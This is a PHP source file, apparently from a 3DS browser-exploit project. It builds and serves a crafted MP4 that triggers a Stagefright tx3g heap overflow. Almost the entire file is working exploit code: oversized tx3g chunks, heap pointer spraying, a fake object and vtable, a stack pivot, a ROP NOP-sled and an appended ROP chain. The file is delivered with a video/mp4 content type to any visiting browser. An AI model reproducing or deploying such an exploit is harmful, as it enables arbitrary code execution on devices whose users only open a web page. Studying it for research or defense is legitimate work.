<?php

//This tx3g version was originally implemented using system-version v10.2, on November 3, 2015. The PoC mp4 this is based on is from roughly October 24, 2015.
//The exploitation method used here is just one of the ways to exploit this(in this case it's the smallest one with overflow-size). Larger overflow-sizes/etc can cause other crashes(with invalid data), stack overwrite included.

include_once("/home/yellows8/browserhax/browserhax_cfg.php");

include_once("3dsbrowserhax_common.php");

if(($browserver & 0x80) == 0)
{
	echo "This browser is not supported.\n";
	//error_log("browserhax_fright.php: BROWSER NOT SUPPORTED.");
	exit;
}

$con = file_get_contents("frighthax_header_tx3g.mp4");

$url_len = strlen("http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']) + 1;//The address of the below mp4 buffer varies depending on the length of the requested URL. Only URLs with string length < 48 characters is currently supported(without updating the below code).
$baseaddr = 0x39531f00;
if($url_len < 33)
{
	$baseaddr = 0x39531ea0;
}
else
{
	if($url_len < 41)
	{
		$url_len-= 32;
	}
	else
	{
		$url_len-= 40;
		$baseaddr = 0x39531f10;
	}
}
$heapaddr_haxdatastart = /*0x39531c88*/$baseaddr+0x1318+0x4 + (($url_len + 0x3) & ~0x3);//Address in the *entire* mp4 buffer, located at the memory for the $heapaddr_haxdata_refcountobj ptrs setup below.
$heapaddr_haxdata_refcountobj = $heapaddr_haxdatastart+0x2000;
$fake_objptr = $heapaddr_haxdata_refcountobj+0x2000;
$fake_vtableptr = $fake_objptr+0x2000;
$stackptr = $fake_vtableptr+0x2000;

$ROPHEAP = 0x10000000-0x1e000;//0x08100000;//Don't use any memory nearby the above mp4 buffer, since that causes corruption issues.

$generatebinrop = 1;
generate_ropchain();

$con.= pack("N*", 0x210);//First tx3g chunk(size+chunkid).
$con.= pack("N*", 0x74783367);

//Setup the data used with the buf-overflow.
for($i=0; $i<0x208; $i+=4)
{
	$writeval = $heapaddr_haxdatastart;
	$con.= pack("V*", $heapaddr_haxdatastart);
}

$con.= pack("N*", 0x1c5);//Setup the mdia chunk.
$con.= pack("N*", 0x6d646961);

$con.= pack("N*", 0x1);//Setup the second tx3g chunk: size+chunkid, followed by the actual chunk size in u64 form.
$con.= pack("N*", 0x74783367);
$con.= pack("N*", 0x1);
$con.= pack("N*", 0xfffffdf0);

for($i=0; $i<0x2000; $i+=4)
{
	$con.= pack("V*", $heapaddr_haxdata_refcountobj);//Ptrs to the memory which gets setup below.
}

for($i=0; $i<(0x2000/0x10); $i++)
{
	$con.= pack("V*", 0x1);
	$con.= pack("V*", 0x1);
	$con.= pack("V*", $fake_objptr);
	$con.= pack("V*", $fake_objptr-4);//If this ptr gets loaded instead of the above one, then the object is @ addr-4.
}

for($i=0; $i<(0x2000/0x10); $i++)//This is where the object data for the above objectptr is located.
{
	$con.= pack("V*", $fake_vtableptr);//Fake vtable ptr, the 0x34-bytes starting here is also popped into r0..ip during stack-pivot.
	//for($pos=0x4; $pos<0x34; $pos+=4)$con.= pack("V*", $fake_vtableptr);//Setup r1..ip for the stack-pivot.
	$con.= pack("V*", $stackptr);//Setup sp for the stack-pivot.
	$con.= pack("V*", $POPPC);//Setup lr for the stack-pivot.
	$con.= pack("V*", $POPPC);//Setup pc for the stack-pivot.
}

for($i=0; $i<0x2000; $i+=4)//This is where the fake vtable for the above object is located.
{
	$con.= pack("V*", $STACKPIVOT_ADR);
}

for($i=0; $i<0x2000; $i+=4)//This is where the ROP stack is located, starting with a ROP NOP-sled.
{
	$con.= pack("V*", $POPPC);
}

$con.= $ROPCHAIN;//Beginning of the actual ROP.

header("Content-Type: video/mp4");

echo $con;

?>
